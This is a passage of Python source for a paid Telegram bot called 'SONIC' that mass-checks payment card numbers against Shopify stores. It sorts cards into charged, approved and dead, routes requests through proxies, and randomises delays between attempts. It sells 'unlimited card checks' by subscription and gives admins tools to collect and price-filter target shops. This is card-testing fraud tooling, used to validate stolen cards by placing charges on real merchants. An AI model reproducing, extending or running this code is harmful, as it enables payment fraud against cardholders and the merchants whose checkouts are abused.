        elif res['status'] == 'Approved' and mode == 'all_hits':
            results['approved'].append(res)
            await send_hit_notification(user_id, res, 'Approved', context)
        elif res['status'] == 'Approved':
            results['approved'].append(res)
        else:
            results['dead'].append(res)
        if idx % 5 == 0 or idx == len(cards)-1:
            elapsed = int(time.time() - results['start'])
            recent = "\n".join([f"{'💎' if c['status']=='Charged' else '✅' if c['status']=='Approved' else '❌'} {c['card'][:8]}*** | {c['msg'][:30]}" for c in card_responses[-5:]])
            progress = f"""<b>💠 SONIC Progress</b>
<blockquote>💎 {len(results['charged'])} | ✅ {len(results['approved'])} | ❌ {len(results['dead'])}</blockquote>
<blockquote>📊 {results['checked']}/{results['total']}</blockquote>
<blockquote>⏱️ {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>📝 Recent Results:</b>
<code>{recent}</code>"""
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_{session_key}"),
                 InlineKeyboardButton("▶️ Resume", callback_data=f"resume_{session_key}"),
                 InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{session_key}")]
            ])
            try:
                await context.bot.edit_message_text(chat_id=user_id, message_id=message_id, text=progress, parse_mode=ParseMode.HTML, reply_markup=kb)
            except:
                pass
        await asyncio.sleep(random.uniform(0.8, 1.2))
    # النتيجة النهائية
    elapsed = int(time.time() - results['start'])
    hits = "\n".join([f"💎 <code>{r['card']}</code> | {r.get('price', '-')}" for r in results['charged'][:10]])
    if mode == 'all_hits':
        hits += "\n" + "\n".join([f"✅ <code>{r['card']}</code> | {r.get('price', '-')}" for r in results['approved'][:10]])
    if not hits:
        hits = "No hits"
    time_left = get_user_time_left(user_id)
    final = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ SONIC Final Results</b>
<blockquote>💎 {len(results['charged'])} | ✅ {len(results['approved'])} | ❌ {len(results['dead'])}</blockquote>
<blockquote>⏱️ Time: {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 Hits</b>
<code>{hits}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⏱️ Time left: {time_left}</b>"""
    await context.bot.edit_message_text(chat_id=user_id, message_id=message_id, text=final, parse_mode=ParseMode.HTML)
    if session_key in active_sessions:
        del active_sessions[session_key]
    user_current_check[user_id] = False

async def control_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data.startswith("pause_"):
        key = data[6:]
        if key in active_sessions:
            active_sessions[key]['paused'] = True
            await query.edit_message_reply_markup(reply_markup=None)
    elif data.startswith("resume_"):
        key = data[7:]
        if key in active_sessions:
            active_sessions[key]['paused'] = False
            await query.edit_message_reply_markup(reply_markup=None)
    elif data.startswith("stop_"):
        key = data[5:]
        if key in active_sessions:
            active_sessions[key]['stop'] = True
            del active_sessions[key]
            await query.edit_message_text("🛑 SONIC check stopped by user")

# ==================== أوامر الأدمن وإدارة المواقع ====================
async def admin_panel(update: Update, context: CallbackContext):
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("❌ Only admin")
        return
    await update.message.reply_text("👑 SONIC Admin Panel", reply_markup=get_admin_main_keyboard())

async def admin_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_admin(user_id):
        await query.edit_message_text("❌ Admin only")
        return
    data = query.data
    if data == "admin_stats":
        users = get_all_users()
        total = len(users)
        active = sum(1 for u in users.values() if u.get('subscription_expiry', 0) > time.time())
        blocked = sum(1 for u in users.values() if u.get('blocked', False))
        sites = len(load_sites())
        codes = len(load_codes())
        await query.edit_message_text(f"<b>📊 SONIC Stats</b>\n👥 Users: {total}\n⭐ Active: {active}\n🚫 Blocked: {blocked}\n🌐 Sites: {sites}\n🎫 Codes: {codes}", parse_mode=ParseMode.HTML, reply_markup=get_admin_main_keyboard())
    elif data == "admin_broadcast":
        context.user_data['broadcast_msg'] = True
        await query.edit_message_text("📢 Send the message to broadcast:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_block":
        context.user_data['block_user'] = True
        await query.edit_message_text("🔨 Send user ID to block:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_unblock":
        context.user_data['unblock_user'] = True
        await query.edit_message_text("🔓 Send user ID to unblock:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_set_limit":
        context.user_data['add_time'] = True
        await query.edit_message_text("📈 Send user_id hours (e.g. 123456789 24):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]))
    elif data == "admin_sites":
        await query.edit_message_text("🌐 Site Management", reply_markup=get_admin_sites_menu())
    elif data == "admin_view_sites":
        sites = load_sites()
        if not sites:
            await query.edit_message_text("📋 No sites found.", reply_markup=get_admin_sites_menu())
        else:
            text = "\n".join([f"• {s}" for s in sites])
            await query.edit_message_text(f"📋 <b>Sites ({len(sites)}):</b>\n\n{text}", parse_mode=ParseMode.HTML, reply_markup=get_admin_sites_menu())
    elif data == "admin_add_site":
        context.user_data['add_site'] = True
        await query.edit_message_text("➕ Send site domain (e.g. example.com):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_sites")]]))
    elif data == "admin_remove_site":
        sites = load_sites()
        if not sites:
            await query.edit_message_text("❌ No sites to remove.", reply_markup=get_admin_sites_menu())
        else:
            kb = [[InlineKeyboardButton(s[:30], callback_data=f"remove_{s}")] for s in sites[:20]]
            kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_sites")])
            await query.edit_message_text("🗑️ Select site to remove:", reply_markup=InlineKeyboardMarkup(kb))
    elif data.startswith("remove_"):
        site = data[7:]
        sites = load_sites()
        if site in sites:
            save_sites([s for s in sites if s != site])
            await query.edit_message_text(f"✅ Removed: {site}", reply_markup=get_admin_sites_menu())
        else:
            await query.edit_message_text("❌ Site not found.", reply_markup=get_admin_sites_menu())
    elif data == "admin_upload_sites":
        context.user_data['upload_sites'] = True
        await query.edit_message_text("📁 Reply to a .txt file containing sites (one per line):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_sites")]]))
    elif data == "admin_check_sites":
        sites = load_sites()
        if not sites:
            await query.edit_message_text("❌ No sites to check.", reply_markup=get_admin_sites_menu())
        else:
            user_pending_sites[user_id] = {'action': 'check', 'sites': sites}
            await query.edit_message_text("💰 Select price range:", reply_markup=get_price_filter_keyboard())
    elif data == "admin_clear_sites":
        save_sites([])
        await query.edit_message_text("✅ All sites cleared!", reply_markup=get_admin_sites_menu())
    elif data == "admin_panel":
        await query.edit_message_text("👑 SONIC Admin Panel", reply_markup=get_admin_main_keyboard())
    elif data.startswith("price_"):
        price_key = data.split("_")[1]
        if price_key == "cancel":
            await query.edit_message_text("Cancelled.", reply_markup=get_admin_sites_menu())
            return
        pending = user_pending_sites.pop(user_id, None)
        if not pending:
            await query.edit_message_text("Session expired", reply_markup=get_admin_sites_menu())
            return
        action = pending['action']
        sites = pending['sites']
        price_range = PRICE_RANGES.get(price_key, PRICE_RANGES["4"])
        proxies = load_user_proxies(user_id)
        if not proxies:
            await query.edit_message_text("❌ No proxies available.", reply_markup=get_admin_sites_menu())
            return
        await query.edit_message_text(f"🔍 Checking {len(sites)} sites with filter: {price_range['name']}...")
        valid = []
        invalid = []
        proxy = random.choice(proxies)
        for site in sites:
            is_shop, _ = await is_site_shopify(site, proxy)
            if not is_shop:
                invalid.append(site)
                continue
            if price_range["min"] > 0 or price_range["max"] < 999999:
                price = await get_site_min_price(site, proxy)
                if price is not None and price > price_range["max"]:
                    invalid.append(site)
                    continue
            valid.append(site)
        if action == 'check':
            save_sites(valid)
            await query.edit_message_text(f"✅ Site Check Complete!\nTotal: {len(sites)}\n✅ Valid Shopify: {len(valid)}\n❌ Removed: {len(invalid)}\n💰 Filter: {price_range['name']}", reply_markup=get_admin_sites_menu())
        else:
            current = load_sites()
            new = [s for s in valid if s not in current]
            save_sites(list(set(current+valid)))
            await query.edit_message_text(f"✅ Sites Added!\nAdded {len(new)} new Shopify sites\nTotal: {len(load_sites())}", reply_markup=get_admin_sites_menu())

async def handle_admin_text(update: Update, context: CallbackContext):
    user = update.effective_user
    if not is_admin(user.id):
        return
    text = update.message.text.strip()
    if context.user_data.get('broadcast_msg'):
        del context.user_data['broadcast_msg']
        users = get_all_users()
        sent = 0
        for uid in users:
            try:
                await context.bot.send_message(chat_id=int(uid), text=f"📢 <b>SONIC Broadcast</b>\n\n{text}", parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.1)
            except:
                pass
        await update.message.reply_text(f"✅ Sent to {sent}/{len(users)} users")
    elif context.user_data.get('block_user'):
        del context.user_data['block_user']
        try:
            uid = int(text)
            block_user(uid)
            await update.message.reply_text(f"✅ Blocked user {uid}")
        except:
            await update.message.reply_text("❌ Invalid user ID")
    elif context.user_data.get('unblock_user'):
        del context.user_data['unblock_user']
        try:
            uid = int(text)
            unblock_user(uid)
            await update.message.reply_text(f"✅ Unblocked user {uid}")
        except:
            await update.message.reply_text("❌ Invalid user ID")
    elif context.user_data.get('add_time'):
        del context.user_data['add_time']
        parts = text.split()
        if len(parts) == 2:
            try:
                uid = int(parts[0])
                hours = int(parts[1])
                seconds = hours * 3600
                users = load_users()
                uid_str = str(uid)
                if uid_str not in users:
                    users[uid_str] = {}
                now = time.time()
                current = users[uid_str].get('subscription_expiry', 0)
                new_expiry = current + seconds if current > now else now + seconds
                users[uid_str]['subscription_expiry'] = new_expiry
                users[uid_str]['premium'] = True
                save_users(users)
                await update.message.reply_text(f"✅ Added {hours} hours to user {uid}")
            except:
                await update.message.reply_text("❌ Invalid input. Usage: user_id hours")
        else:
            await update.message.reply_text("❌ Usage: user_id hours")
    elif context.user_data.get('add_site'):
        del context.user_data['add_site']
        site = text.replace('https://', '').replace('http://', '').rstrip('/')
        proxies = load_user_proxies(user.id)
        if not proxies:
            await update.message.reply_text("❌ No proxies available")
            return
        msg = await update.message.reply_text(f"🔄 Testing {site}...")
        is_shop, _ = await is_site_shopify(site, random.choice(proxies))
        if is_shop:
            sites = load_sites()
            if site not in sites:
                save_sites(sites + [site])
                await msg.edit_text(f"✅ Site added: {site}")
            else:
                await msg.edit_text(f"⚠️ Site already exists: {site}")
        else:
            await msg.edit_text(f"❌ Could not add site (Not Shopify or dead)")
    elif context.user_data.get('upload_sites'):
        del context.user_data['upload_sites']
        if not update.message.reply_to_message or not update.message.reply_to_message.document:
            await update.message.reply_text("❌ Reply to a .txt file")
            return
        doc = update.message.reply_to_message.document
        if not doc.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Please reply to a .txt file")
            return
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_sites_{user.id}.txt"
        await file.download_to_drive(path)
        async with aiofiles.open(path, 'r') as f:
            content = await f.read()
        new_sites = [l.strip().replace('https://', '').replace('http://', '').rstrip('/') for l in content.split('\n') if l.strip()]
        os.remove(path)
        if not new_sites:
            await update.message.reply_text("❌ No valid sites")
            return
        user_pending_sites[user.id] = {'action': 'add', 'sites': new_sites}
        await update.message.reply_text(f"💰 Select price range for {len(new_sites)} sites:", reply_markup=get_price_filter_keyboard())

# ==================== الاشتراك والدفع ====================
async def subscribe(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    await update.message.reply_text("⭐ <b>SONIC Premium Subscription</b>\n\nPay with Telegram Stars.\nGet time-based access!\n\n📋 Plans:\n• 1 Hour - 30⭐\n• 12 Hours - 50⭐\n• 1 Day - 100⭐\n• 3 Days - 250⭐\n• 1 Week - 500⭐\n\n🔥 Unlimited card checks during subscription!\n\n👑 Bot Owner: @ISoonik\n📢 Channel: @ReGict7", parse_mode=ParseMode.HTML, reply_markup=get_subscription_keyboard())

async def subscription_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data.startswith("sub_"):
        plan_key = data[4:]
        plan = STAR_PRICES.get(plan_key)
        if not plan:
            await query.edit_message_text("Invalid plan")
            return
        await context.bot.send_invoice(
            chat_id=query.from_user.id,
            title=f"⭐ SONIC - {plan['name']}",
            description=f"Subscribe for {plan['name']}\nGet unlimited card checks for {plan['name']}\n\n👑 Bot Owner: @ISoonik",
            payload=f"sub_{plan_key}",
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice(label=plan['name'], amount=plan['stars'])],
            start_parameter="sonic_sub"
        )
    elif data == "main_menu":
        await query.edit_message_text(await get_user_stats_text(query.from_user.id, query.from_user.username or str(query.from_user.id)), parse_mode=ParseMode.HTML, reply_markup=get_main_keyboard())

async def pre_checkout(update: Update, context: CallbackContext):
    query: PreCheckoutQuery = update.pre_checkout_query
    await query.answer(ok=True)

async def successful_payment(update: Update, context: CallbackContext):
    payment: SuccessfulPayment = update.message.successful_payment
    user_id = update.effective_user.id
    payload = payment.invoice_payload
    if payload.startswith("sub_"):
        plan_key = payload[4:]
        if activate_subscription(user_id, plan_key):
            plan = STAR_PRICES[plan_key]
            await update.message.reply_text(f"✅ <b>SONIC Subscription Activated!</b>\n\n⭐ Plan: {plan['name']}\n📅 Expires after {plan['name']}\n\n🔥 Enjoy unlimited card checks!\n👑 Bot Owner: @ISoonik", parse_mode=ParseMode.HTML)
            for admin in ADMIN_IDS:
                await context.bot.send_message(admin, f"💎 <b>SONIC - Star Payment!</b>\n👤 User: <code>{user_id}</code>\n⭐ Plan: {plan['name']}\n💰 Amount: {plan['stars']} stars", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("❌ Error activating subscription. Contact admin.")

async def redeem(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    if is_admin(user.id):
        await update.message.reply_text("👑 You are admin, no need to redeem!")
        return
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: /redeem CODE")
        return
    code = args[1].strip().upper()
    success, msg = activate_code(user.id, code)
    await update.message.reply_text(msg)

# ==================== أوامر إضافية للأدمن ====================
async def gencode(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    args = update.message.text.split()
    hours = 24
    if len(args) > 1:
        try:
            hours = int(args[1])
        except:
            pass
    seconds = hours * 3600
    code = create_activation_code(seconds)
    await update.message.reply_text(f"✅ <b>SONIC Code Generated!</b>\n\nCode: <code>{code}</code>\nDuration: {hours} hours", parse_mode=ParseMode.HTML)

async def users_list(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    users = get_all_users()
    if not users:
        await update.message.reply_text("No users")
        return
    text = "<b>📋 Users List:</b>\n\n"
    for uid, data in list(users.items())[:50]:
        username = data.get('username', '?')
        blocked = "🚫" if data.get('blocked') else "✅"
        active = "⭐" if data.get('subscription_expiry', 0) > time.time() else "❌"
        text += f"<code>{uid}</code> | @{username} | {active} | {blocked}\n"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def user_info(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text("❌ /user user_id")
        return
    uid = args[1]
    users = load_users()
    data = users.get(uid, {})
    expiry = data.get('subscription_expiry', 0)
    expiry_str = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S') if expiry > 0 else "No subscription"
    text = f"""<b>👤 User {uid}</b>
├ Username: @{data.get('username', '?')}
├ Blocked: {data.get('blocked', False)}
├ Premium: {data.get('premium', False)}
├ Registered: {data.get('registered_at', '?')[:10]}
└ Expires: {expiry_str}"""
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def stats(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    users = get_all_users()
    total = len(users)
    active = sum(1 for u in users.values() if u.get('subscription_expiry', 0) > time.time())
    blocked = sum(1 for u in users.values() if u.get('blocked', False))
    codes = len(load_codes())
    sites = len(load_sites())
    await update.message.reply_text(f"<b>📊 SONIC Stats</b>\n👥 Users: {total}\n⭐ Active: {active}\n🚫 Blocked: {blocked}\n🌐 Sites: {sites}\n🎫 Codes: {codes}", parse_mode=ParseMode.HTML)

# ==================== أوامر المواقع البسيطة ====================
async def site_command(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: /site domain.com")
        return
    site = args[1].replace('https://', '').replace('http://', '').rstrip('/')
    proxies = load_user_proxies(update.effective_user.id)
    if not proxies:
        await update.message.reply_text("❌ Add proxies first")
        return
    msg = await update.message.reply_text(f"🔄 Testing {site}...")
    is_shop, _ = await is_site_shopify(site, random.choice(proxies))
    if is_shop:
        sites = load_sites()
        if site in sites:
            await msg.edit_text(f"⚠️ Site already exists: {site}")
        else:
            save_sites(sites + [site])
            await msg.edit_text(f"✅ Site added: {site}")
    else:
        await msg.edit_text(f"❌ Could not add site (Not Shopify)")

async def rmsite(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: /rmsite domain.com")
        return
    site = args[1]
    sites = load_sites()
    if site not in sites:
        await update.message.reply_text(f"❌ Site not found")
        return
    save_sites([s for s in sites if s != site])
    await update.message.reply_text(f"✅ Removed: {site}")

async def clearsites(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    count = len(load_sites())
    if count == 0:
        await update.message.reply_text("❌ No sites to clear")
        return
    save_sites([])
    await update.message.reply_text(f"✅ Cleared all {count} sites")

async def mysites(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    sites = load_sites()
    if not sites:
        await update.message.reply_text("📋 No sites found.")
        return
    text = "\n".join([f"• {s}" for s in sites])
    await update.message.reply_text(f"📋 <b>Sites ({len(sites)}):</b>\n\n{text}", parse_mode=ParseMode.HTML)

# ==================== التشغيل ====================
def main():
    # إنشاء المجلدات اللازمة
    os.makedirs('sessions', exist_ok=True)
    if not os.path.exists('sites.txt'):
        open('sites.txt', 'w').close()
    # إعداد التطبيق
    application = Application.builder().token(BOT_TOKEN).build()
    # الأوامر
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("profile", profile))
    application.add_handler(CommandHandler("myproxy", myproxy))
    application.add_handler(CommandHandler("addproxy", addproxy))
    application.add_handler(CommandHandler("addproxies", addproxies))
    application.add_handler(CommandHandler("chkproxy", chkproxy))
    application.add_handler(CommandHandler("rmproxy", rmproxy))
    application.add_handler(CommandHandler("clearproxy", clearproxy))
    application.add_handler(CommandHandler("proxy", proxy_check))
    application.add_handler(CommandHandler("getproxy", getproxy))
    application.add_handler(CommandHandler("mcancel", mcancel))
    application.add_handler(CommandHandler("cc", single_cc))
    application.add_handler(CommandHandler("chk", mass_check))
    application.add_handler(CommandHandler("subscribe", subscribe))
    application.add_handler(CommandHandler("redeem", redeem))
    # أوامر الأدمن
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("gencode", gencode))
    application.add_handler(CommandHandler("users", users_list))
    application.add_handler(CommandHandler("user", user_info))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("site", site_command))
    application.add_handler(CommandHandler("rmsite", rmsite))
    application.add_handler(CommandHandler("clearsites", clearsites))
    application.add_handler(CommandHandler("mysites", mysites))
    # معالجات الدفع
    application.add_handler(PreCheckoutQueryHandler(pre_checkout))
    application.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment))
    # معالجات الكيبورد
    application.add_handler(CallbackQueryHandler(subscription_callback, pattern="^(sub_|main_menu)"))
    application.add_handler(CallbackQueryHandler(mode_selection, pattern="^(mode_charges|mode_all|mode_cancel)"))
    application.add_handler(CallbackQueryHandler(control_callback, pattern="^(pause_|resume_|stop_)"))
    application.add_handler(CallbackQueryHandler(admin_callback, pattern="^(admin_|price_|remove_|price_cancel)"))
    # معالجات النص للأدمن
    application.add_handler(MessageHandler(filters.TEXT & filters.User(ADMIN_IDS), handle_admin_text))
    # تشغيل البوت
    print("✅ SONIC BOT STARTED (python-telegram-bot version)")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"⭐ Plans: {len(STAR_PRICES)}")
    application.run_polling()

if __name__ == '__main__':
    main()
